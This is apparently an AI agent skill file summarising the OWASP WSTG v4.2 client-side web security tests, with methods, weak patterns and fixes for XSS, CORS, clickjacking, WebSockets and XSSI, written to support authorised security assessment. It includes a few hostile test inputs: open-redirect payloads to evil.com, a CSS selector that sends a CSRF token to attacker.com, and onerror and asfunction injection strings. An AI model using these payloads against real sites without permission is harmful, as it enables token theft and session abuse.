---
name: wstg-client-side
description: Use when testing client-side security, DOM-based XSS, JavaScript execution, HTML injection, CSS injection, client-side resource manipulation, cross-origin resource sharing (CORS), clickjacking, WebSockets, WebSocket security, browser storage, localStorage/sessionStorage, or cross-site scripting inclusion during a penetration test or security assessment.
---

# WSTG v4.2 Client-Side Testing

Client-side attacks exploit vulnerabilities in code that executes in the browser rather than on the server. Unlike server-side flaws, these vulnerabilities often execute without the server detecting them, evading traditional WAFs and XSS filters. Testing must focus on how user-controlled data enters the DOM (sources) and where it exits into execution contexts (sinks).

## Quick-Reference Table

| ID | Test | Core Objective |
|----|------|---------------|
| WSTG-CLNT-01 | DOM-Based XSS | Identify DOM sinks where attacker-controlled sources reach unsanitized execution |
| WSTG-CLNT-02 | JavaScript Execution | Find sinks that evaluate arbitrary JavaScript strings (eval, setTimeout, Function) |
| WSTG-CLNT-03 | HTML Injection | Locate injection points into innerHTML, document.write, and jQuery DOM setters |
| WSTG-CLNT-04 | Client-Side URL Redirect | Assess URL/path inputs reaching window.location or similar redirect sinks |
| WSTG-CLNT-05 | CSS Injection | Identify user-controlled CSS reaching cssText, style attributes, or stylesheet rules |
| WSTG-CLNT-06 | Resource Manipulation | Find user-controlled resource attributes (script src, iframe src, AJAX URLs) |
| WSTG-CLNT-07 | Cross Origin Resource Sharing | Evaluate CORS headers for wildcard origins, reflected origins, and credential leakage |
| WSTG-CLNT-08 | Cross Site Flashing | Decompile SWF files; find unsafe ActionScript methods and FlashVar injection points |
| WSTG-CLNT-09 | Clickjacking | Determine if target pages can be framed; test bypasses of frame-busting and X-Frame-Options |
| WSTG-CLNT-10 | WebSockets | Verify origin validation, TLS usage, authentication, authorization, and input sanitization |
| WSTG-CLNT-11 | Web Messaging | Examine postMessage listeners for missing origin checks and unsafe data handling |
| WSTG-CLNT-12 | Browser Storage | Audit localStorage, sessionStorage, IndexedDB, cookies, and window globals for sensitive data |
| WSTG-CLNT-13 | Cross Site Script Inclusion | Detect sensitive data leakage via cross-origin <script> inclusion, JSONP, or global variables |

---

## WSTG-CLNT-01 — DOM-Based Cross Site Scripting

**Objective:** Identify DOM sinks that receive attacker-controlled input via browser sources (location, document.referrer, window.name, postMessage, etc.) and reach an execution sink without sanitization.

**Why it matters:** DOM XSS executes purely in the browser without a server round-trip. The server never sees the payload, so WAFs, output encoders, and server-side filters are completely blind to the attack.

**How to test:**
- Crawl the application to enumerate all JavaScript execution contexts, including inline scripts, event handlers, and CSS expression attributes.
- Trace data flow from sources (window.location, document.URL, document.referrer, location.hash, window.name, postMessage, localStorage, navigator.userAgent) to sinks (document.write, innerHTML, eval, setTimeout/setInterval with strings, Function constructor, location.href, element.src).
- Distinguish between server-inserted data (server can sanitize) and client-side source data (browser applies only built-in encoding).
- Automated scanners detect reflected XSS by observing payloads in server responses; they miss conditional client-side flows (e.g., browser-detection branching, setTimeout chains). Manual source-to-sink tracing is essential.
- Construct payloads that match each sink type: HTML context for innerHTML, JavaScript context for eval, URL context for location.href.

**What to look for:**
- Source-to-sink paths where data flows from URL fragments, window.name, or postMessage directly into document.write or innerHTML.
- Unvalidated use of decodeURIComponent or unescape on attacker-controlled inputs.
- Conditional branching that hides sinks behind browser/feature detection.

**Remediation:** Apply context-sensitive output encoding. Use safe APIs (textContent instead of innerHTML, encodeURIComponent for URLs). Implement DOM XSS Prevention Cheat Sheet controls.

---

## WSTG-CLNT-02 — JavaScript Execution

**Objective:** Identify sinks where attacker-controlled strings are evaluated as JavaScript code.

**Why it matters:** JavaScript injection is a subtype of XSS that occurs when user input is passed to eval-like functions. Unlike DOM XSS which may require specific HTML/JavaScript contexts, direct JS execution is the most dangerous sink.

**How to test:**
- Search for functions that execute strings as code: eval(), setTimeout(string), setInterval(string), new Function(), execScript().
- Trace whether user-controlled sources (location.hash, query parameters, postMessage data) reach these sinks.
- Test with payloads that fit the execution context — single quotes, double quotes, context-breaking characters.
- Check if the application uses JSON.parse (safe) versus eval() (unsafe) for JSON deserialization.

**What to look for:**
- eval('(' + userInput + ')') patterns used as a poor substitute for JSON.parse.
- Dynamic function construction from URL fragments.
- String interpolation inside setTimeout or setInterval.

**Remediation:** Never use eval with untrusted data. Replace eval with JSON.parse for JSON processing. Refactor Function constructors to pre-defined logic. Use CSP to block inline script execution.

---

## WSTG-CLNT-03 — HTML Injection

**Objective:** Identify injection points where attacker-controlled strings are rendered as HTML markup.

**Why it matters:** HTML injection allows attackers to insert arbitrary DOM nodes, including script tags, event handlers on injected elements, or phishing forms that exfiltrate credentials. It is the gateway to stored and reflected XSS.

**How to test:**
- Audit all uses of innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln, and jQuery .html().
- Check whether user-controlled data reaches these sinks without sanitization or encoding.
- Test with payloads that include event handlers (`<img src=x onerror=...>`), script blocks, and DOM-mutating tags.
- Verify whether DOM-purifying libraries (e.g., DOMPurify) are in use and correctly configured.

**What to look for:**
- Unsanitized concatenation into innerHTML from URL parameters or hashes.
- jQuery .html() receiving unvalidated data from AJAX responses.
- Server-rendered variables placed into JavaScript strings without proper escaping.

**Remediation:** Use textContent or innerText instead of innerHTML for plain text. Sanitize HTML through DOMPurify or equivalent. Apply output encoding for the HTML context.

---

## WSTG-CLNT-04 — Client-Side URL Redirect

**Objective:** Identify injection points that control URL redirections initiated by client-side code.

**Why it matters:** Open redirects enable phishing attacks where the trusted domain is the visible origin, lending legitimacy. Combined with javascript: URIs, this escalates to JavaScript injection. Open redirects can also bypass access-control flows by redirecting authenticated users to privileged endpoints.

**How to test:**
- Locate assignments to window.location, location.href, location.replace, location.assign, window.open.
- Trace whether URL fragments, query parameters, or postMessage data reach these assignments.
- Test with external URLs (http://evil.com), protocol-relative URLs (//evil.com), and javascript: URIs.
- Verify whether the application validates the target URL protocol, domain, or path.

**What to look for:**
- location.hash used directly as a redirect destination without protocol validation.
- decodeURIComponent applied to attacker-controlled URLs without subsequent scheme checking.
- Path traversal in redirect parameters that could navigate within the trusted domain.

**Remediation:** Maintain a whitelist of allowed redirect destinations. Validate the protocol (only http/https). Use relative paths internally. Never pass user-controlled URLs directly to redirect functions.

---

## WSTG-CLNT-05 — CSS Injection

**Objective:** Identify injection points where user-controlled data interferes with CSS style declarations.

**Why it matters:** CSS injection can escalate to: (1) JavaScript execution via expression() or -o-link etc. in older browsers, (2) sensitive data exfiltration through CSS selectors that trigger external URL loads, and (3) UI manipulation that hides or overlays legitimate content.

**How to test:**
- Audit style attribute assignments (element.style.cssText, element.setAttribute('style', ...)) and stylesheet injection points.
- Check whether user data enters CSS contexts without validation (e.g., PHP echo into <style> blocks).
- Test CSS-based data exfiltration using attribute selectors (input[name=csrf][value^=a] → background-image: url(//attacker.com/a)).
- Assess capability for blind data extraction through @import and font-face tricks.

**What to look for:**
- User-controllable color, font, or custom-CSS fields reflected in inline styles.
- Dynamic stylesheet generation from URL parameters.
- Input[value^=] brute-force extraction patterns.

**Remediation:** Validate and whitelist CSS property values. Use Content-Security-Policy to restrict style sources. Never reflect user input into <style> blocks without context-aware escaping. Disable inline style attributes via CSP.

---

## WSTG-CLNT-06 — Client-Side Resource Manipulation

**Objective:** Identify injection points that control the URLs of resources loaded by the page.

**Why it matters:** Controlling resource URLs (script src, iframe src, img src, AJAX endpoint, CSS href) allows attackers to inject malicious code, exfiltrate data via CORS, or deface the page. This is a powerful primitive because it directly controls what the browser fetches and executes.

**How to test:**
- Examine sinks by tag type: iframe src, a href, link href, img src, object data, xhr.open() URL parameter, createElement('script').src.
- Trace user-controlled inputs (location.hash, query parameters) to each sink.
- For AJAX sinks: verify whether the URL can be pointed to attacker-controlled domains, enabling malicious JSON responses.
- For script element sinks: assess whether protocols other than https are blocked.

**What to look for:**
- Unvalidated location.hash passed to xhr.open() — enables CORS-based data exfiltration.
- createElement('script').src assigned from URL fragments without domain whitelisting.
- iframe src controlled by query parameters, allowing phishing or malware hosting.

**Remediation:** Whitelist allowed resource domains. Validate URL schemes (only https). Use Subresource Integrity (SRI) hashes for external scripts. Server-side validate all resource URLs.

---

## WSTG-CLNT-07 — Cross Origin Resource Sharing (CORS)

**Objective:** Evaluate CORS configurations for insecure origin allowlisting, credential leakage, and input-validation flaws in cross-origin AJAX calls.

**Why it matters:** Misconfigured CORS allows any domain to read responses intended for same-origin consumption, bypassing the browser's same-origin policy. Combined with credential inclusion (withCredentials: true), this leaks authenticated responses to attacker domains.

**How to test:**
- Inspect all cross-origin responses for CORS headers: Access-Control-Allow-Origin, Access-Control-Allow-Credentials, Access-Control-Allow-Methods, Access-Control-Allow-Headers.
- Identify wildcard origins (`Access-Control-Allow-Origin: *`) — acceptable only for public APIs without credentials.
- Detect reflected-origin patterns where the server echoes the Origin request header without validation.
- Test preflight OPTIONS requests to enumerate allowed methods and headers.
- Audit client-side JavaScript for XMLHttpRequest or fetch calls where the URL parameter is user-controlled — this creates an injection point for cross-origin requests.

**What to look for:**
- `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` (invalid per spec, but still exploitable).
- Origin header reflected verbatim in Access-Control-Allow-Origin.
- User-controlled AJAX URLs that allow injection of attacker-controlled domains.
- Response data inserted into innerHTML without sanitization after cross-origin fetch.

**Remediation:** Never use wildcard origins with credentialed requests. Maintain an explicit allowlist of trusted origins. Do not reflect the Origin header. Validate and sanitize all cross-origin AJAX response data before DOM insertion.

---

## WSTG-CLNT-08 — Cross Site Flashing (XSF)

**Objective:** Decompile SWF files, identify unsafe ActionScript methods, and test FlashVar injection points.

**Why it matters:** Flash applications embedded in browsers provide a separate runtime with its own security model. Vulnerable SWF files can be used for XSS-like attacks (XSF), open redirects, or phishing via injected content. Many Flash functions (loadMovie, getURL, ExternalInterface, navigateToURL) accept URLs that can execute JavaScript or load malicious SWF files.

**How to test:**
- Decompile SWF files to ActionScript source.
- In ActionScript 2.0: any uninitialized global variable (`_root.varname`, `_global.varname`) is populated from URL parameters (FlashVars). Trace these to unsafe methods.
- In ActionScript 3.0: examine LoaderInfo(this.root.loaderInfo).parameters assignments.
- Identify unsafe method sinks: loadVariables(), loadMovie(), loadMovieNum(), getURL(), navigateToURL(), ExternalInterface.call(), LoadVars.load(), XML.load(), NetStream.play(), Sound.loadSound(), TextField.htmlText.
- Test asfunction injection (`asfunction:getURL,javascript:evilcode`) in every URL-accepting parameter.
- Test HTML injection through TextField.htmlText with `<a href="javascript:...">` and `<img>` payloads.
- Test ExternalInterface injection by controlling arguments to ExternalInterface.call() — the browser internally evaluates it as `try{__flash__toXML(attackerArg)}catch(e){}`.

**What to look for:**
- Open-redirect SWFs that call getURL/navigateToURL with FlashVar-controlled destinations.
- Undefined global variables in AS2 that accept URL parameters directly.
- htmlText-enabled TextFields with attacker-controlled content.
- asfunction protocol abuse in any URL parameter.

**Remediation:** Migrate away from Flash. If Flash remains: initialize all variables, validate FlashVars against whitelists, avoid dynamic URL construction, never use getURL/navigateToURL with user-supplied values, and serve SWF files with Content-Disposition: attachment to block direct browser embedding.

---

## WSTG-CLNT-09 — Clickjacking

**Objective:** Determine whether the target application is vulnerable to UI redressing — where a victim is tricked into clicking on hidden/transparent elements loaded inside an iframe.

**Why it matters:** Clickjacking bypasses CSRF protections because the victim performs the action on the legitimate site within an authenticated session. The attacker frames a sensitive page (e.g., "Transfer Money"), makes it invisible, and overlays it with deceptive UI elements. The victim thinks they are clicking a "Win Prize" button but are actually authorizing a financial transaction.

**How to test:**
- Attempt to frame the target page in a simple iframe on a test page. Success = no protection.
- If framing is blocked, investigate the protection mechanism:
  - **Client-side frame busting:** Test double-framing (nesting the target in an outer frame so parent.location access violates descendant policy). Test disabling JavaScript via IE restricted frames, HTML5 sandbox attribute, or designMode. Test onBeforeUnload event flooding to suppress navigation. Test XSS filter false positives by injecting frame-busting code snippets into request parameters. Test location redefinition in IE (var location = "xyz") and Safari (defineSetter).
  - **Server-side X-Frame-Options:** Check for missing headers on mobile versions. Test proxy stripping scenarios. Verify the header is present on all sensitive pages, not just the homepage.
  - **Content-Security-Policy frame-ancestors:** Test whether the directive is present and correctly scoped.
- Build a proof-of-concept that demonstrates actionable exploitation by overlaying a transparent iframe over attacker-controlled UI.

**What to look for:**
- Sensitive pages that load inside iframes without any framing protection.
- Mobile/responsive versions of the site lacking X-Frame-Options.
- Double-framing bypass of parent.location checks.
- DOM-based XSS that could inject an iframe on the target origin.

**Remediation:** Use X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' on all pages. Apply to mobile versions. Do not rely on client-side frame busting alone — JavaScript-based defenses are bypassable.

---

## WSTG-CLNT-10 — WebSockets

**Objective:** Assess the security of WebSocket implementations, including origin validation, transport encryption, authentication, authorization, and input sanitization.

**Why it matters:** WebSockets maintain persistent full-duplex connections. A missing origin check allows cross-site WebSocket hijacking (CSWSH) — similar to CSRF, an attacker's page connects to the victim's WebSocket server and sends/receives data in the victim's authenticated context. Unencrypted ws:// connections expose all traffic to interception.

**How to test:**
- Black-box:
  - Identify WebSocket usage by inspecting JavaScript source for ws:// or wss:// schemes and the browser's developer tools Network tab for 101 Switching Protocols responses.
  - Test origin validation by connecting from a different origin using a WebSocket client. If the handshake succeeds, the server does not validate the Origin header.
  - Verify transport encryption: sensitive data should only flow over wss://, never ws://.
  - Test authentication and authorization as with regular HTTP requests — WebSockets do not inherently handle these.
  - Fuzz WebSocket messages for injection vectors (XSS in relayed messages, SQL injection if data reaches server-side queries, command injection).
- Gray-box:
  - Review API documentation for expected message formats and test boundary conditions.
  - Check that the server validates not just the handshake Origin but also authorization tokens within each message (since the connection is persistent).

**What to look for:**
- WebSocket handshake that accepts any origin.
- wss:// downgrade to ws:// or mixed content warnings.
- No re-authentication or token validation within WebSocket messages after handshake.
- Reflected chat messages or data pushed to all clients without sanitization (stored XSS over WebSockets).

**Remediation:** Validate the Origin header on every WebSocket handshake. Enforce wss:// only. Implement per-message authentication tokens. Sanitize all relayed WebSocket data before rendering in the DOM.

---

## WSTG-CLNT-11 — Web Messaging

**Objective:** Assess the security of postMessage API implementations, focusing on origin validation and safe message handling.

**Why it matters:** postMessage enables cross-origin communication between windows, iframes, and tabs. Without strict origin checks, a malicious page can send messages and leak data or trigger unauthorized actions. Combined with missing input validation, it enables DOM XSS through innerHTML or eval on received message data.

**How to test:**
- Examine all message event listeners (addEventListener('message', ...)) in JavaScript source.
- Audit origin validation: check if the expected origin is verified strictly (exact match with scheme, host, port) versus weak substring checks (indexOf('.owasp.org') != -1 matches attacker-controlled subdomains like owasp.org.attacker.com).
- Check if `*` is used as the target origin in postMessage calls — this broadcasts to any listening window.
- Audit message data handling: trace event.data to sinks such as innerHTML, eval(), document.write, or Function().
- Test whether DOM XSS is possible by sending crafted messages to the target page.

**What to look for:**
- Missing origin validation on message listeners (accepts any origin).
- Weak origin checks using indexOf or regex that fail to enforce exact origin matching.
- `postMessage(data, '*')` — the wildcard target leaks data to any window.
- event.data passed directly to innerHTML, eval, or jQuery .html().
- Variable-length message parsing that can be manipulated.

**Remediation:** Always validate message origin with strict exact-string comparison (event.origin === 'https://trusted.domain.com'). Never use `*` as targetOrigin unless the data is public. Treat all message data as untrusted; use safe DOM APIs (textContent) and structured parsing (JSON.parse with schema validation).

---

## WSTG-CLNT-12 — Browser Storage

**Objective:** Audit all client-side storage mechanisms for sensitive data exposure and assess code handling for injection vulnerabilities.

**Why it matters:** Data stored client-side is accessible to any script running on the same origin, including injected malicious scripts (XSS payloads). Sensitive data (tokens, keys, PII) stored in localStorage or sessionStorage is readable by any XSS on the same origin, defeating token-based protections.

**How to test:**
- **localStorage:** Enumerate all key-value entries using the browser developer tools or console. Check for session tokens, JWTs, API keys, user PII, passwords, or financial data. Verify whether sensitive values persist after logout or browser close (localStorage persists across sessions).
- **sessionStorage:** Same enumeration but verify data is cleared on tab close. Check for tokens that should be HttpOnly cookies instead.
- **IndexedDB:** Enumerate all databases and object stores. Look for CryptoKeys with extractable: true (should be false for private keys). Check for structured data containing PII or credentials.
- **Cookies:** Check for missing HttpOnly flag (accessible to JavaScript), missing Secure flag, and tokens with overly broad Path/Domain scopes.
- **Window globals:** Enumerate custom properties attached to the window object during runtime. Check for global state holding sensitive tokens or session data.
- **Code handling:** Trace whether storage values flow into DOM sinks without sanitization. Check for JSON.parse usage on storage values without schema validation.

**What to look for:**
- JWT/access tokens in localStorage — readable by any XSS.
- extractable: true CryptoKeys in IndexedDB.
- Session identifiers duplicated in storage (cookies plus localStorage).
- Deprecated Web SQL databases still in use.
- Untrusted storage data inserted into innerHTML without DOMPurify.

**Remediation:** Store sensitive data server-side. Use HttpOnly, Secure, SameSite cookies for session tokens. Never store JWTs or credentials in localStorage. Set CryptoKey extractable: false. Validate and sanitize all storage-retrieved data before DOM insertion.

---

## WSTG-CLNT-13 — Cross Site Script Inclusion (XSSI)

**Objective:** Detect sensitive data leakage through cross-origin script inclusion, where an attacker's page includes a victim's dynamic JavaScript resource via a <script> tag and reads exposed global variables or intercepted function calls.

**Why it matters:** The browser's same-origin policy does not apply to <script> tag inclusions — JavaScript files from any origin can be loaded and executed. If sensitive data is embedded in a JavaScript file (even one requiring authentication), a malicious cross-origin page can include that script, trigger execution, and capture exposed data through global variables, function-parameter interception, or prototype overrides.

**How to test:**
- Identify endpoints serving dynamic JavaScript, JSONP, CSV, or other text-based responses with sensitive data. Compare authenticated vs. unauthenticated responses — dynamic responses differ based on session state.
- Test vehicles for data leakage:
  1. **Global variables:** If the script assigns sensitive data to window properties, an attacker's page can read them after script inclusion.
  2. **Global function parameters:** If the script calls a window-level function with sensitive data, the attacker pre-defines that function to capture the argument.
  3. **CSV with quotation theft:** If injection points exist in CSV columns, insert JavaScript to break out of the data context and capture subsequent rows.
  4. **JavaScript runtime errors (legacy IE9/10):** Include non-JavaScript files as script src; error messages leak partial file content.
  5. **Prototype chaining via this:** Override Array.prototype.forEach or similar methods. When the target script iterates arrays with sensitive data, the attacker's overridden function receives the array elements as this.
  6. **Array constructor override:** Override window.Array to intercept JSON arrays parsed by older browsers.
  7. **UTF-16 charset trick:** Set `<script charset="UTF-16BE">` to reinterpret non-JS data as JavaScript identifiers.
- Test JSONP endpoints specifically — the callback parameter lets the attacker name the function that receives the data.

**What to look for:**
- JSONP endpoints without CSRF tokens or Referer validation.
- API keys, tokens, or user data assigned to global window properties.
- Global function calls passing secrets as arguments.
- Dynamic JavaScript responses that differ between authenticated and unauthenticated states.
- Prototype methods that can be overridden to intercept sensitive array iterations.

**Remediation:** Use unique nonces or CSRF tokens in JSONP callback parameters. Avoid exposing sensitive data in JavaScript files. Serve authenticated dynamic scripts with `X-Content-Type-Options: nosniff` and proper Content-Type headers. Use server-side session validation on every dynamic script request. Prefer CORS + XMLHttpRequest over JSONP for cross-origin data access — it provides origin-based access control.

---

## Common Vulnerability Patterns & Bug-Finding Efficiency Tips

### High-Yield Attack Surfaces
1. **URL fragment (location.hash):** The most under-tested source. It never reaches the server, rendering all agent-based scanners blind. Audit every usage of location.hash in JavaScript source — these are often one-character payload exploitations.
2. **postMessage with wildcard or missing origin checks:** One `addEventListener('message', fn)` without origin validation = fully controllable data flow from any origin.
3. **innerHTML from any remotely controllable source:** The gap between "user can control data" and "unsafe DOM insertion" is the most common exploit path.

### Efficiency Tactics
- **Source-to-sink mapping:** Build a mental (or tool-assisted) graph of sources (location.*, document.*, window.*, storage, postMessage) to sinks (innerHTML, eval, document.write, location, script.src). Focus testing on uncovered paths.
- **Crawl thoroughly:** JavaScript-heavy SPAs hide routes behind event handlers and dynamic imports. Use a headless browser and monitor all script execution, not just server-rendered pages.
- **Prioritize sink density:** Functions with many sinks (jQuery .html(), innerHTML assignments inside loops, xhr callbacks writing to DOM) are higher value than isolated document.write calls.
- **Test missing protections first:** Check for the absence of security headers (CSP, X-Frame-Options, CORS restrictions) before deep-diving into bypass techniques — missing protections are the fastest wins.
- **Authenticated vs. unauthenticated delta:** Compare page behavior with and without authentication. Dynamic content differences reveal sensitive data aggregation points for XSSI.

### Category-Specific Weakness Patterns
- **DOM XSS:** debugger statements in production code, commented-out source-to-sink paths, third-party SDKs with undocumented sinks.
- **CORS:** null origins allowed (local files), regex-based origin matching that can be bypassed with attacker-controlled subdomains.
- **Clickjacking:** login pages and account-deletion pages as prime targets; mobile APIs with weaker framing protection.
- **WebSockets:** no authentication re-check after the initial handshake — the server trusts the client indefinitely.
- **Browser Storage:** timestamped tokens (expiry enforced client-side only), CRUD data cached in localStorage instead of sessionStorage.

---

## Remediation Guidance Summary

| Test ID | Primary Fix | Secondary Fix |
|---------|-------------|---------------|
| CLNT-01 | Context-sensitive output encoding; safe DOM APIs (textContent) | CSP with nonce/hash-based script execution |
| CLNT-02 | Replace eval() with JSON.parse; remove string-based setTimeout | CSP to block inline scripts |
| CLNT-03 | DOMPurify or equivalent HTML sanitization | Content-Security-Policy enforcement |
| CLNT-04 | URL whitelist; protocol validation (http/https only) | Relative-path redirects internally |
| CLNT-05 | Validate CSS property values against whitelists | CSP style-src restrictions |
| CLNT-06 | Domain whitelisting for resource URLs | Subresource Integrity (SRI) hashes |
| CLNT-07 | Explicit origin allowlist; no wildcard + credentials | Validate cross-origin response data |
| CLNT-08 | Migrate from Flash; if remaining, validate all FlashVars | Serve SWFs with Content-Disposition: attachment |
| CLNT-09 | X-Frame-Options: DENY or CSP frame-ancestors 'none' | Apply to all pages including mobile |
| CLNT-10 | Validate Origin header on handshake; enforce wss:// | Per-message token validation |
| CLNT-11 | Strict origin comparison on message listeners | Safe DOM APIs for received data |
| CLNT-12 | HttpOnly Secure SameSite cookies for secrets | No sensitive data in localStorage/IndexedDB |
| CLNT-13 | CSRF tokens for JSONP; avoid sensitive data in JS files | X-Content-Type-Options: nosniff |

---

## References

- OWASP Web Security Testing Guide v4.2 — Section 4.11: Client-side Testing
- OWASP DOM-based XSS Prevention Cheat Sheet
- OWASP Clickjacking Defense Cheat Sheet
- OWASP HTML5 Security Cheat Sheet
- OWASP Securing Cascading Style Sheets Cheat Sheet
- OWASP Session Management Cheat Sheet
- W3C CORS Specification
- IETF WebSocket Protocol (RFC 6455)
- WHATWG HTML5 Web Messaging Specification
